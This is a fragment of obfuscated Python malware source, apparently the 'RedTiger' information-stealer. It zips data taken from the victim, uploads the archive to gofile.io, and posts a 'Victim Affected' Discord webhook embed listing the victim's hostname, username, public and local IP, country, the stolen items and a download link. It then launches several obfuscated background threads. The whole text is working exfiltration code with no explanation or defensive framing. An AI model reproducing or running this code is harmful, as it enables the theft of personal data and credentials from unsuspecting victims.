        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Apps              : {RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL}")
    
    if ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS != None:
        JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI.append(f"Interesting Files : {ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS}")

GOMODDOPZCDQKZRALUSURUKXEVMQTEUGJJCXERVLJWCISOPKLJWFPITOJYADQQXOHFMKLUNG.seek(0)

try:
    try: YUITQIPZNZCERPVLZFZOQZHABXDBKPRGBVQSZBWFRWOFSNRUZJMOOJZTIQKBVTQKNWUQJCEQDSFPRCCJJDNFEGIURYPV = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: YUITQIPZNZCERPVLZFZOQZHABXDBKPRGBVQSZBWFRWOFSNRUZJMOOJZTIQKBVTQKNWUQJCEQDSFPRCCJJDNFEGIURYPV = "store4"

    QCTMZVCTULWXVRZEQMUJKAGJUIYZVGEMCKBSBXDDYZLZYVKQCAWKZBGX = requests.post(
        f"https://{YUITQIPZNZCERPVLZFZOQZHABXDBKPRGBVQSZBWFRWOFSNRUZJMOOJZTIQKBVTQKNWUQJCEQDSFPRCCJJDNFEGIURYPV}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF.replace(' ', '_')}.zip", GOMODDOPZCDQKZRALUSURUKXEVMQTEUGJJCXERVLJWCISOPKLJWFPITOJYADQQXOHFMKLUNG)}
    )

    IYWUNKZCIGJANLTBBFDGSJVUYFBBSWNZGPFJZUIXCKSJENMBVLVHFVLOAIWVQLMDJEDGYQMJQLE = QCTMZVCTULWXVRZEQMUJKAGJUIYZVGEMCKBSBXDDYZLZYVKQCAWKZBGX.json()["data"]["downloadPage"]
except Exception as e:
    IYWUNKZCIGJANLTBBFDGSJVUYFBBSWNZGPFJZUIXCKSJENMBVLVHFVLOAIWVQLMDJEDGYQMJQLE = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=FSEQNBXZZBZQDXIQBWQPLZRLMTAILBWAXBLZWCNRRMCGZDTLOHZWGBAMRQHDKIWRPWITBFJYKMRGXKQUCGZSVAVSNKXDP
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {KSEIFZCAVIJFXKVVEEMJQGSVLTQHITZXQLEAGGKHAYOSXEFZAPAPDVJGDQDGJRIFJQLHZZMAA}
Username    : {HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF}
DisplayName : {EBPUGGZBUXZTJUUNAKAQNHVLKGYYRJWFIELCDLRBFTNWWBDDSZLKIDVJHWJUZES}
Ip Public   : {KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK}
Ip Local    : {ONUWOMSQHOFNGAJOLHPJRHENDOCBOGTVEHKMCDAOCGZZSEHPHMWPQZVAQHNPMJBYFUKELXJNVBCWBZINXOHYDNOGHBRPNO}
Country     : {IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(JREIUSKXMKOHBNGSDVLELFYZJIFCPWTLXHYFHWUQHSJJZBBWAPZJWRGOI)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{IYWUNKZCIGJANLTBBFDGSJVUYFBBSWNZGPFJZUIXCKSJENMBVLVHFVLOAIWVQLMDJEDGYQMJQLE}"""
).set_footer(
    text=SIWVHBFTDLLWWJGZQYCHKQQYCXFHKQFRMTNZOOLELRVVVLOOINAJQMPYOZZEFBEXHTVXNORXWNJWFXNZXHIVSBFLAAMMG, 
    icon_url=OSHPIUHGICAPWGMBRGEHNGFPLIZJRALNHIICANVIKADVLAELZAAIDEBNMJPMLOMNGIGDAHU
)

try:  
    OXLZHYHGCJJBTYCUHRWARWKYYOSXCWYFSICFLTBIFOQFQPMJCYB = discord.SyncWebhook.from_url(JOCMFRVMGIQTXZFFAFAZXHWFLFQEYTNKZLGXZKIKEOIICLYLLQTFBSLLDSIJFXYRBQLHUYGXMSCBCKDISBVA)
    OXLZHYHGCJJBTYCUHRWARWKYYOSXCWYFSICFLTBIFOQFQPMJCYB.send(embed=embed, username=OCOKZAPOAWILFUIAMUHJOXCZOTPCCZXCIRJWXDQSTUTDJLJBFFY, avatar_url=OSHPIUHGICAPWGMBRGEHNGFPLIZJRALNHIICANVIKADVLAELZAAIDEBNMJPMLOMNGIGDAHU)
except: pass


try: threading.Thread(target=TLXPLYMENBZMDJPGGOFMQCQMAQNBGXNUJJZZNCOCLFUZFXJFSREQVCSQXKOEEJSLFTLXTVIZAHQLPTIYZKQFFMNYGUPTUITWE).start()
except: pass
try: threading.Thread(target=OQYURLSOEFKIWINHZVQPANZTEHZOOTAUXWXJQFQXZONGATZVQXQPLUWULKZ).start()
except: pass
try: threading.Thread(target=CTVTNFCEFKZHYOCMFDNCFHMYLQZTWCSUZQDSRQVWNISIKGESZGQCAAMDOKV).start()
except: pass
try: threading.Thread(target=TOBQYQVCPNISQDXVPJALMSETNSIICHBCPADUDRSAIWGFNTKYTUOBEGXBLED).start()
except: pass
try: threading.Thread(target=PXHEKWIEWZNVPMUUEBSMQQIAHNRPBLWFYMQHWSGVPKGABBXCPSLFRJJYHKTZIUSTKZGKQHDRQRAVVOTJQSNFOZZ).start()
except: pass
try: threading.Thread(target=XLTMJTBKRBJRGVDODCOTEEZCAZHZDCRRVLAFRIWGBWMLCSOUFTNCWVEGRHVYUUHKPHSKWGPIMG).start()
except: pass
try: threading.Thread(target=IAEMBZMHOJMQHQQNTEKCMHORQFBNXVUXDDYTQJFASAMXCYBJMCQIMGPTDVZNDNZIXKMJP).start()
except: pass
try: threading.Thread(target=JOIMGTPPUCXKAVGVKONGEOXTKGXUEUDESUOKMVTRGCFCJCCENWIMSIXNAVI).start()
except: pass
